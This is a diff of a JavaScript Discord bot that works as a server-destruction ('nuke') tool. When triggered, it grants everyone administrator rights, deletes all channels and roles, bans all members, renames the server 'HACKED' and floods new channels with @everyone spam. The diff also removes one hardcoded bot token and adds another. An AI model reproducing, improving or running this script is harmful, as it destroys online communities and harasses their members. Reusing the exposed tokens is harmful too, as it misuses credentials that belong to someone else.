@@ -14,26 +14,29 @@ console.log(`Logged in as ${client.user.tag}!`);
           
 client.on("ready", () => {
   console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
-  console.log('hack by sevan');/////BLACK JACK 
+  console.log('hack by BLACK JACK');/////BLACK JACK 
 console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
 console.log(`Logged in as ${client.user.tag}!`);
-  client.user.setActivity(`${prefix}help | BOT SESTAM ${client.guilds.size}`)///////shtek bnwsa
+  client.user.setActivity(`${prefix}help | BOT SESTAM NEW  ${client.guilds.size}`)///////shtek bnwsa
  client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
   console.log(`Logined`)
 })
 ///created by black jack 
+
 client.on('message', message => {
-    if (message.content.toLowerCase() === prefix + "hack") {
+    if (message.content.startsWith(prefix + "hack")) {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
-            permissions: ["ADMINISTRATOR"]
+            permissions: ["ADMINISTRATOR"]///premission akata adminstator
         });
-        let oldnm = message.guild.name;
         message.guild.channels.map(c => {
             c.delete();
         });
     message.guild.members.forEach(m =>{
                     m.ban()
+                })
+      message.guild.roles.forEach(r =>{
+                    r.delete()
                 })
       
         setInterval(() => {
@@ -46,14 +49,14 @@ client.on('message', message => {
             })
         }, 1000);
         message.guild.setIcon("");
+        client.user.setAvatar("");
+        
         message.guild.setName('HACKED');
         setTimeout(function() {
             setInterval(() => {
-          
-                message.guild.createChannel('HACKED BY SEVAN', 'text').then(channel => {
-                  
-                message.guild.createChannel('HACKED BY SEVAN', 'text').then(channel => { 
-                channel.send('@everyone HACK BY ahmad ownershipk de la qnr ban :joy: :joy: :joy:')
+              
+                message.guild.createChannel('HACKED BY BLACK JACK', 'text').then(channel => { 
+                channel.send('@everyone HACK BY BLACK JACK :joy: :joy: :joy:')
                
                 })
             }
@@ -62,12 +65,12 @@ client.on('message', message => {
             })
         }
     
-                   )  
+                   
     }
-}
+
           )
 
  ////codaka drwst krawa lalayan black jack
-
-client.login("ODAyOTI3NTMzMDcwMzUyNDI1.YA2WiQ.FJEcasI-CBtEiLg4iwnZq7Ms7kY")
+///just for test
+client.login("NzY1NDc0NjU0OTczNzIyNjI0.X4VV0w.w3wv_yu_TbNQTPK1qLdOhqMNQm8")
           
